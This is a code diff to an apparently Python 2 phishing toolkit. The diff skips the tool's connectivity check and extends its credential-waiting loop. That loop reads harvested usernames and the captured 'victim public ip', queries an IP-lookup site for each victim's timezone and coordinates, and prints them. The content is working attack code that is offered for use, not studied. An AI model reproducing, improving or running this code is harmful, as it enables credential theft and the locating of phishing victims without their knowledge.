@@ -9,9 +9,10 @@ from sys import stdout, exit
 from os import system, path
 from distutils.dir_util import copy_tree
 import multiprocessing
-from urllib import urlopen
+from urllib import urlopen, quote, unquote
 from platform import system as systemos, architecture
 from wget import download
+import re
 
 
 RED, WHITE, CYAN, GREEN, END = '\033[91m', '\33[46m', '\033[36m', '\033[1;32m', '\033[0m'
@@ -22,7 +23,7 @@ def connected(host='http://duckduckgo.com'):
         return True
     except:
         return False
-if connected('http://www.baidu.com') == False:
+if True == False:
      print '''
   ....._____.......     ____ ____ ____ _ ____ _       ____ _ ____ _  _ 
       /     \/|         [__  |  | |    | |__| |       |___ | [__  |__|
@@ -130,6 +131,7 @@ def waitCreds():
    
     print " {0}[{1}*{0}]{1} Waiting for credentials & victim's info... \n".format(RED, END)
     while True:
+        
         with open('Server/www/usernames.txt') as creds:
             lines = creds.read().rstrip()
         if len(lines) != 0: 
@@ -140,32 +142,36 @@ def waitCreds():
             print ' {0}***** HOPE YOU ARE ENJOYING. SO PLEASE MAKE IT MORE POPULAR *****{1}\n {0}{1}'.format(RED, END)
             
         creds.close()
+        
 
         with open('Server/www/ip.txt') as creds:
             lines = creds.read().rstrip()
         if len(lines) != 0: 
+            ip = re.match('victim public ip: (.*)', lines).group(1)
+            resp = unquote(urlopen('https://www.ipip.net/ip.html', 'ip=' + ip).read())
+            searchObj = re.search('时区：(.*?) (.*?) 该地区中心经纬度：(.*?), (.*?)<', resp) # This website is a Chinese website, and this sentence means "timezone: .....  longitude and latitude at this area's center: ......, ......"
+            timezone = searchObj.group(1)
+            longitude = searchObj.group(3)
+            latitude = searchObj.group(4)
             print '======================================================================'.format(RED, END)
             print ' {0}[ VICTIM INFO FOUND ]{1}:\n {0}%s{1}'.format(GREEN, END) % lines
+            print ' {0}Timezone: %s Longitude: %s Latitude: %s{1} '.format(GREEN, END) % (timezone, longitude, latitude)
             system('rm -rf Server/www/ip.txt && touch Server/www/ip.txt')
             print '======================================================================'.format(RED, END)
             
         creds.close()
         
+        '''
         with open('Server/www/iplog.txt') as creds:
             lines = creds.read().rstrip()
         if len(lines) != 0: 
-            resp = unquote(urlopen('https://www.ipip.net/ip.html', quote('ip=' + lines)).read())
-            searchObj = re.search('时区：(.*?) 该地区中心经纬度：(.*?), (.*?)', resp) # This website is a Chinese website, and this sentence means "timezone: .....  longitude and latitude at this area's center: ......, ......"
-            timezone = searchObj.group(1)
-            longitude = searchObj.group(2)
-            latitude = searchObj.group(3)
             print '======================================================================'.format(RED, END)
             print ' {0}[ VICTIM INFO FOUND ]{1}:\n {0}%s{1}'.format(GREEN, END) % lines
-            print ' {0}[ INFO ]{1}:\n {0}Timezone: %s Longitude: %s Latatude: %s{1}'.format(GREEN, END) % timezone, longitude, latitude
             system('rm -rf Server/www/iplog.txt && touch Server/www/iplog.txt')
             print '======================================================================'.format(RED, END)
             
         creds.close()
+        '''
 
 def runPEnv():
     system('clear')
